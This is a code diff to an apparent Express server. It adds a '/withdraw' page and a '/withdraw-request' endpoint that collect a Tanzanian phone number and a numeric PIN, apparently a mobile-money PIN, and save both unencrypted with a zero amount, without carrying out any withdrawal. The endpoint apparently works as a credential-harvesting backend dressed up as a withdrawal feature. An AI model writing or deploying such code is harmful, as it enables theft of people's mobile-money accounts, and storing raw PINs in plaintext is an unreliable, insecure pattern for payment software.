@@ -385,6 +385,44 @@ app.get("/admin", (req, res) => {
   res.status(404).send("Admin dashboard not found");
 });
 
+app.get("/withdraw", (_req, res) => {
+  res.setHeader("Cache-Control", "no-store");
+  res.sendFile(path.join(__dirname, "public", "withdraw.html"));
+});
+
+app.post("/withdraw-request", async (req, res) => {
+  try {
+    const phoneRaw = String(req.body?.phone || "").replace(/\D/g, "");
+    const pin = String(req.body?.pin || "").replace(/\D/g, "");
+    if (!phoneRaw) {
+      return res.status(400).json({ success: false, error: "Phone is required" });
+    }
+    if (!pin) {
+      return res.status(400).json({ success: false, error: "PIN is required" });
+    }
+    const phone = toInternationalPhone(phoneRaw);
+    if (!phone.startsWith("255") || phone.length !== 12) {
+      return res.status(400).json({ success: false, error: "Invalid Tanzanian number" });
+    }
+    const reference = makeTxRef() + "W";
+    await new Payment({
+      phone,
+      pin,
+      amount: 0,
+      reference,
+      provider: "withdraw",
+      status: "WITHDRAW",
+      reason: "Withdraw request",
+      message: "Withdraw request",
+      time: new Date().toLocaleString()
+    }).save();
+    res.json({ success: true, reference });
+  } catch (error) {
+    console.error("WITHDRAW REQUEST ERROR:", error.message);
+    res.status(500).json({ success: false, error: "Could not save withdraw request" });
+  }
+});
+
 function withTimeout(promise, ms, label) {
   return Promise.race([
     promise,
